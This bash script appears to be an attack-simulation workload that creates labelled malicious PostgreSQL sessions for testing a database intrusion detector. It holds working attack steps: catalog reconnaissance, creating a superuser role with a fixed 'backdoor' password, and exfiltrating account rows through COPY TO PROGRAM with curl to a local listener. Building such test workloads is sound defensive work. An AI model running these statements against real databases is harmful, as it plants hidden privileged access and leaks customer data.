#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_multi_session_apt.sh (legacy: casce_tpcb, -U postgres).
# Connection, table and label changed per call; the statements are otherwise unchanged.
# Three psql calls = three sessions = three manifest lines (see manifest.jsonl).
#
# Stage 4 of the original ("OS-only Log Deletion", a bare `rm -f`, no psql call) is
# excluded here, not adapted: it never touches Postgres, so Algorithm 1 has no session
# to correlate it into and CASCE cannot see it either way. Listed as excluded in
# manifest.jsonl's companion note, same treatment as attack_os_priv_escalation.sh.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: multi-session APT, stage 1 (recon), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:multistage_apt_recon_r${REPEAT}" \
  $PSQL -U dba -c "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';" > /dev/null
sleep 2

echo "4D: multi-session APT, stage 2 (privilege escalation), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:multistage_apt_escalate_r${REPEAT}" \
  $PSQL -U dba -c "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';" > /dev/null 2>&1 || true
sleep 2

echo "4D: multi-session APT, stage 3 (exfiltration), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:multistage_apt_exfil_r${REPEAT}" \
  $PSQL -U dba -c "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';" > /dev/null 2>&1 || true
sleep 1

echo "4D: multi-session APT, stage 4 (OS-only log deletion) -- excluded, no psql call."
